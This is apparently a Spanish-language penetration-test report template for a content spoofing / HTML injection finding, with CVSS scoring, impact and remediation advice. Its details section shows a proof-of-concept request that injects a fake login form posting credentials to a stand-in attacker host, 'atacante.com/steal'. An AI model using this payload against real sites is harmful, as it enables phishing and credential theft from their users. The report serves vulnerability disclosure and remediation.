# Content Spoofing / HTML Injection (CWE-345) - {{Alta | Media}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{7.4}}` |
| **CWE** | [CWE-345 – Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html) |
| **OWASP** | A03:2021 – Injection |
| **Estado** | {{Abierto}} |

## Descripción

El content spoofing (o inyección de HTML/texto) permite a un atacante inyectar contenido
arbitrario —marcado HTML, enlaces, formularios falsos, texto— que la aplicación muestra
como si fuera legítimo, dentro de su dominio confiable. Aunque no ejecute JavaScript
(a diferencia del XSS), habilita phishing altamente creíble, defacement y engaño al usuario.

## Componentes Afectados

- `{{https://app.cliente.com/page?msg=}}`
- **Parámetros:** `{{msg}}`, `{{content}}`, `{{error}}`

## Detalles

Se comprobó que el parámetro `{{msg}}` se refleja sin sanitizar, permitiendo inyectar
contenido HTML que se muestra dentro del dominio legítimo.

**Paso 1 — Inyección de contenido de phishing**

```http
GET /page?msg=<h2>Sesión expirada</h2><form action="https://atacante.com/steal" method="POST">Usuario:<input name="u">Clave:<input name="p" type="password"><input type="submit" value="Ingresar"></form> HTTP/1.1
Host: app.cliente.com
```

```http
HTTP/1.1 200 OK
...<div>{{contenido inyectado renderizado como parte de la página legítima}}</div>...
```

> _Figura {{N}}: formulario de inicio de sesión falso renderizado dentro del dominio confiable._

## Impacto

Permite construir campañas de phishing muy creíbles aprovechando la confianza en el
dominio legítimo, induciendo a los usuarios a entregar credenciales o información
sensible, además de defacement reputacional.

## Remediación

- Codificar y sanitizar toda entrada reflejada en la respuesta HTML.
- No reflejar parámetros controlados por el usuario directamente en el cuerpo de la página.
- Aplicar Content-Security-Policy y validación estricta de entrada.

## Referencias

- https://cwe.mitre.org/data/definitions/345.html
- https://owasp.org/www-community/attacks/Content_Spoofing
- https://owasp.org/Top10/A03_2021-Injection/
